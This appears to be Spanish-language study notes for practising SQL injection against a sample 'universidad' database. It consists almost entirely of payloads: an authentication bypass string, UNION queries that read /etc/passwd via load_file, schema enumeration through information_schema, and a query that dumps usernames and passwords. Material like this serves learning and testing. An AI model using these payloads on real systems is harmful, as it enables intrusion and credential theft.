
admin' or 1=1 -- -


SEELCT id,password FROM Alumnos WHERE username="admin";
SELECT username,password FROM Alumnos WHERE id=1;

SELECT username,password FROM Alumnos WHERE id=1'';
SELECT username,password FROM Alumnos ORDER BY 2;-- -;

# EXTRAYENDO DATOS
SELECT username,password FROM Alumnos UNION SELECT @@version, load_file("/etc/passwd");-- -;
SELECT username,password FROM Alumnos UNION SELECT user(), database();-- -;

# MOSTRAR LAS TABLAS DE UNA BASE DE DATOS
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT table_name, NULL FROM information_schema.tables where table_schema="universidad";-- -;

# HEXADECIMAL
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT table_name, NULL FROM information_schema.tables where table_schema=0x756e697665727369646164;-- -;

# LISTAR TODAS LAS BASE DE DATOS
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT schema_name, NULL FROM information_schema.schemata;-- -;
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT schema_name, NULL FROM information_schema.schemata LIMIT 1,1;-- -;
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT schema_name, NULL FROM information_schema.schemata LIMIT 2,1;-- -;
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT schema_name, NULL FROM information_schema.schemata LIMIT 3,1;-- -;

# ENUMERAR LAS COLUMNAS DE UNA TABLA
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema="universidad" AND table_name="Alumnos";-- -;

SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema="universidad" AND table_name="Alumnos" LIMIT 1,1;-- -;

SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema="universidad" AND table_name="Alumnos" LIMIT 2,1;-- -;



# LISTAR USUARIOS Y CONTRASEÑAS
SELECT username,password FROM Alumnos WHERE id=1 UNION SELECT concat(username,0x3a,password),NULL FROM universidad.Alumnos;-- -;


